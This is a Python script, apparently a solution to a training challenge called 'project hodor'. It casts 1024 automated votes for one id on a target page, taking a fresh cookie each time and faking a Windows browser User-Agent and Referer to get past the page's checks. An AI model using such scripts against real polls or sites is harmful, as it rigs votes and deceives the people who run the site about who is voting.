#!/usr/bin/python3
import requests
"""level_2 module

    Votes 1024 times (hopefully) for id 2529 on level_2 of project hodor
    Voting requires to send the value from a cookie to work
    AND voting needs to come from a Windows machine
    """

# Target URL
url = "http://158.69.76.135/level2.php"

failed = 0
success = 0
total = 1024

# Start a session
session = requests.Session()

# Loop and pray
for i in range(total):
    # Request the form page and fetch the cookie
    res = session.get(url)
    dict = session.cookies.get_dict()

    # Modify User-Agent with a Windows signature
    headers = {'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) \
               AppleWebKit/537.36 (KHTML, like Gecko) \
               Chrome/87.0.4280.88 Safari/537.36",
               'Referer': url}
    # Prepare payload of the POST request
    data = {'id': 2529,
            'key': dict['HoldTheDoor'],
            'holdthedoor': 'Envoyer'}

    # Lick the stamp and SEND IT
    post = session.post(url, data=data, headers=headers)

    # Print stuff after each request
    print("Request #{:d}".format(i), end=' ')
    print("Key: {:s}".format(dict['HoldTheDoor']), end=' ')
    if post and "hacker" not in post.text:
        print("Request success")
        success += 1
    else:
        print("Request fail")
        failed += 1
    # Clear session cookies
    session.cookies.clear()

# Print stuff after all requests are done
print("{:d} requests sent".format(total))
print("{:d} requests succeded".format(success))
print("{:d} requests failed".format(failed))
